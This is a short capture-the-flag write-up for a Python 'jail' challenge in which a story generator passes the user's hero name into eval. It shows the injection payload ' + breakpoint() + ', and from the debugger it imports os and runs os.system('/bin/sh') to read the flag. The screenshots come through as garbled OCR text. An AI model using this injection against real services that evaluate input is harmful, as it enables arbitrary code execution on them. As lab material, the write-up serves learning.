# Fairy Tale
> Type in your favorite hero and let Fairy Tale spin a unique story for you.

## About the Challenge
We got a server to connect without a source. Here is the preview of the challenge


[Image extracted text: Welcome
to
the
Enhanced Dynamic Story
Game !
Enter
your
hero
name
test
In
an
ancient kingdom,
test
must
rescue
Queen Mirabella
from
the
Ancient Dragon
After
long journey ,
test
and
Queen
Mirabella
outsmart
the villain,
restoring
harmony]


If we try to input `'`, we'll get an error message like this:


[Image extracted text: Enter
your
hero
name
Traceback
(most
recent
call
last) :
File
Tapp/jailgame.pY
line
50
in
<module>
dynamic_story_game_
v2 ( )
File
Iappljailgame
py
line
25
in dynamic_story_game_
hero_name
eval(f"nm|
{user_input} | '##") #hero_name
ast.literal_eval(fun
{user_input} | '
I M
^iiiimmmmmmimiiiiiiiiiiiii^^^
File "<string>"
line
CV2]


It seems like our input is being passed into the `ast.literal_eval()` function

## How to Solve?
To solve this chall, im calling `breakpoint()` function and then call `/bin/sh` by importing `os` package

```
' + breakpoint() + '
```


[Image extracted text: >
breakpoint ( )
TypeError:
can
concatenate
str
(not
'NoneType" )
to
str
<string> (1) <module>( )
(Pdb)
import
05
(Pdb)
05
system( " /bin/sh" )
1s
Dockerfile
README
IF
YOU
ARE
THE
ADMIN
jailgame.py
server
py
cat
ictf{b3_Clr3full_In_3rrOr5}
only
flag
flag]


```
ictf{b3_C4r3full_1n_3rr0r5}
```